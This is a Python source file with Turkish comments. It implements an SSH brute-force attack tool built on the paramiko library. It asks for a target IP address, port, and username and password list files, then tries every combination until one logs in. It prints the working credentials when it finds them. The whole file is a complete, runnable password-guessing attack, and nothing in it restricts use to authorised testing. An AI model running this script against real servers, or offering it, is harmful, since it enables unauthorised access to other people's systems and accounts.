import paramiko
import logging

# Paramiko için logging ayarları
logging.basicConfig(level=logging.INFO)

def ssh_login(ip_address, username, password, port=22):
    """
    Verilen IP adresine, kullanıcı adı ve şifre ile SSH bağlantısı denemesi yapar.
    Başarılıysa True, başarısızsa False döner.
    """
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # SSH bağlantısını kur
        ssh.connect(ip_address, port=port, username=username, password=password, timeout=10)
        print(f"Başarılı giriş! Kullanıcı Adı: {username}, Şifre: {password}")
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        # Kimlik doğrulama başarısız oldu
        return False
    except paramiko.SSHException as e:
        # SSH ile ilgili hatalar
        print(f"SSH hatası: {e}")
        return False
    except Exception as e:
        # Diğer hatalar (bağlantı hatası vb.)
        print(f"Bağlantı hatası: {e}")
        return False

def load_file(filepath):
    """
    Verilen dosyayı yükler ve boşluklardan arındırılmış satır listesini döner.
    """
    try:
        with open(filepath, 'r') as file:
            return [line.strip() for line in file]
    except FileNotFoundError:
        print(f"Dosya bulunamadı: {filepath}")
        return []

def main():
    ip_address = input("IP adresini girin: ")
    port = input("SSH portunu girin (varsayılan 22): ")
    port = int(port) if port else 22  # Varsayılan olarak 22 portunu kullan
    username_file = input("Kullanıcı adı dosyasının yolunu girin: ")
    password_file = input("Şifre dosyasının yolunu girin: ")

    usernames = load_file(username_file)
    passwords = load_file(password_file)

    if not usernames or not passwords:
        print("Kullanıcı adı veya şifre dosyası boş veya bulunamadı.")
        return

    # Her kullanıcı adı ve şifre kombinasyonunu dene
    for username in usernames:
        for password in passwords:
            if ssh_login(ip_address, username, password, port):
                print(f"Geçerli kimlik bilgileri bulundu: Kullanıcı Adı = {username}, Şifre = {password}")
                return  # Geçerli kimlik bilgileri bulunduğunda çık

    print("Geçerli kimlik bilgileri bulunamadı.")

if __name__ == "__main__":
    main()
